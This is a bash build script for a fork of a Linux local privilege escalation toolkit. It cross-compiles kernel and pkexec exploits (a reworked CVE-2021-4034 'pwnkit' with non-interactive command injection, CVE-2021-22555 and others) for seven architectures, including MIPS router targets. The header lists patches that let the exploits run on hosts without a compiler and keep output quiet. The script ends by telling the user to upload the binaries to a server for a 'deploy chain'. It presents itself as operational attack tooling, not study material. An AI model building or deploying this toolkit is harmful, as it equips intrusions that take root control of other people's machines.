#!/bin/bash
# Full build of the lpe-toolkit fork for all 7 architectures:
# amd64, arm64, 386, mips, mipsle, mips64, mips64le (same set as upstream).
# Output: build_out/lpe-fork-{amd64,arm64,386,mips,mipsle,mips64,mips64le}.
#
# Build method: a persistent builder container (toolchain installed once and
# verified), which avoids re-installing deps on every run and sidesteps
# occasional docker image-store corruption.
#
# Fork patch list (vs upstream main 2ecb09b):
#   1. exploits/cve_2021_4034.c - self-contained berdav-based rewrite
#      (no gcc on target, dual trigger channel, non-interactive PK_CMD,
#      watcher cleanup), embedding a per-arch pwnkit.so;
#   2. exploits/pwnkit_so_src/pwnkit.c - gconv module (marker + PK_CMD);
#   3. copyfail - copyfail-go for amd64/arm64/386 (C version observed
#      failing), upstream C implementation kept for the mips family;
#   4. toolkit.go - removed pwnkit gcc SkipCheck; -c injects PK_CMD;
#      pkExecuted prevents double execution; GTFOBins noise silenced in -q;
#   5. build-exploits.sh - no early abort on missing arch dirs;
#      vendored linux/io_uring.h v6.14 (needed by pintheft).
#
# Lazy sync: when upstream ships a relevant CVE, run:
#   git pull upstream main && ./build.sh
set -euo pipefail
cd "$(dirname "$0")"
BUILDER="lpe-fork-builder-c"

echo "[*] Preparing builder container (toolchain install + verify, once)..."
if ! docker ps --format '{{.Names}}' | grep -qx "$BUILDER"; then
    docker rm -f "$BUILDER" >/dev/null 2>&1 || true
    docker run -d --name "$BUILDER" --platform linux/amd64 \
        -v "$PWD:/work" -w /work golang:1.22-bookworm sleep infinity >/dev/null
    docker exec "$BUILDER" bash -c '
        set -e
        apt-get update -qq >/dev/null 2>&1 || apt-get update -qq >/dev/null 2>&1 || true
        apt-get install -y -qq gcc gcc-aarch64-linux-gnu gcc-i686-linux-gnu \
            gcc-mips-linux-gnu gcc-mipsel-linux-gnu \
            gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 vim-common >/dev/null 2>&1 \
            || apt-get install -y -qq gcc gcc-aarch64-linux-gnu gcc-i686-linux-gnu \
            gcc-mips-linux-gnu gcc-mipsel-linux-gnu \
            gcc-mips64-linux-gnuabi64 gcc-mips64el-linux-gnuabi64 vim-common >/dev/null 2>&1
        mkdir -p /usr/include/linux /usr/include/x86_64-linux-gnu/linux \
            /usr/aarch64-linux-gnu/include/linux /usr/i686-linux-gnu/include/linux \
            /usr/mips-linux-gnu/include/linux /usr/mipsel-linux-gnu/include/linux \
            /usr/mips64-linux-gnuabi64/include/linux /usr/mips64el-linux-gnuabi64/include/linux
        cp /work/build-assets/linux/io_uring.h /usr/include/linux/io_uring.h
        # native multiarch and cross toolchains have different include roots
        cp /usr/include/linux/io_uring.h /usr/include/x86_64-linux-gnu/linux/io_uring.h
        for t in aarch64-linux-gnu i686-linux-gnu mips-linux-gnu mipsel-linux-gnu \
                 mips64-linux-gnuabi64 mips64el-linux-gnuabi64; do
            cp /usr/include/linux/io_uring.h "/usr/$t/include/linux/io_uring.h"
        done
        for c in gcc aarch64-linux-gnu-gcc i686-linux-gnu-gcc mips-linux-gnu-gcc \
                 mipsel-linux-gnu-gcc mips64-linux-gnuabi64-gcc mips64el-linux-gnuabi64-gcc xxd; do
            command -v "$c" >/dev/null
        done
        test -f /usr/include/x86_64-linux-gnu/bits/wordsize.h
        printf "int main(void){return 0;}\n" > /tmp/smoke.c
        gcc -static -o /tmp/smoke /tmp/smoke.c
        aarch64-linux-gnu-gcc -static -o /tmp/smoke_a64 /tmp/smoke.c
        i686-linux-gnu-gcc -static -o /tmp/smoke_i386 /tmp/smoke.c
        mips-linux-gnu-gcc -static -o /tmp/smoke_mips /tmp/smoke.c
        mipsel-linux-gnu-gcc -static -o /tmp/smoke_mipsel /tmp/smoke.c
        mips64-linux-gnuabi64-gcc -static -o /tmp/smoke_mips64 /tmp/smoke.c
        mips64el-linux-gnuabi64-gcc -static -o /tmp/smoke_mips64el /tmp/smoke.c
        echo "toolchain verified"
    ' || { echo "FATAL: builder init failed"; docker rm -f "$BUILDER" >/dev/null 2>&1 || true; exit 1; }
fi

echo "[*] Generating per-arch pwnkit_so_<arch>.h..."
./exploits/rebuild_pwnkit_so.sh

echo "[*] Cross-compiling exploits..."
docker exec "$BUILDER" bash -c '
    set -e
    cd /work
    rm -rf exploits/bin build_out
    for A in amd64 arm64 386 mips mipsle mips64 mips64le; do
        cp /work/exploits/pwnkit_so_$A.h /work/exploits/pwnkit_so.h
        TARGET_ARCH=$A ./build-exploits.sh >/tmp/b_$A.log 2>&1 || { echo "$A FAIL"; tail -8 /tmp/b_$A.log; exit 1; }
    done
    # copyfail: Go binary for amd64/arm64/386, C implementation for mips family
    cp exploits/vendor_bin/amd64/copyfail exploits/bin/amd64/copyfail
    cp exploits/vendor_bin/arm64/copyfail exploits/bin/arm64/copyfail
    cp exploits/vendor_bin/386/copyfail   exploits/bin/386/copyfail
    # cve_2021_22555 is 32-bit only; amd64 ships the multilib-built binary
    cp exploits/vendor_bin/amd64/cve_2021_22555 exploits/bin/amd64/cve_2021_22555
    for a in amd64 arm64 386 mips mipsle mips64 mips64le; do
        echo -n "$a: "; ls exploits/bin/$a 2>/dev/null | wc -l
    done
'

echo "[*] Packaging Go binaries for all 7 archs..."
docker exec "$BUILDER" bash -c '
    set -e
    cd /work
    mkdir -p build_out
    GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o build_out/lpe-fork-amd64 .
    GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o build_out/lpe-fork-arm64 .
    GOOS=linux GOARCH=386   go build -ldflags="-s -w" -o build_out/lpe-fork-386 .
    GOOS=linux GOARCH=mips GOMIPS=softfloat go build -ldflags="-s -w" -o build_out/lpe-fork-mips .
    GOOS=linux GOARCH=mipsle GOMIPS=softfloat go build -ldflags="-s -w" -o build_out/lpe-fork-mipsle .
    GOOS=linux GOARCH=mips64 go build -ldflags="-s -w" -o build_out/lpe-fork-mips64 .
    GOOS=linux GOARCH=mips64le go build -ldflags="-s -w" -o build_out/lpe-fork-mips64le .
    ls -la build_out/
'

echo "OK: build_out/lpe-fork-{amd64,arm64,386,mips,mipsle,mips64,mips64le} ready."
echo "Upload to your own server/CDN for the deploy chain to use."
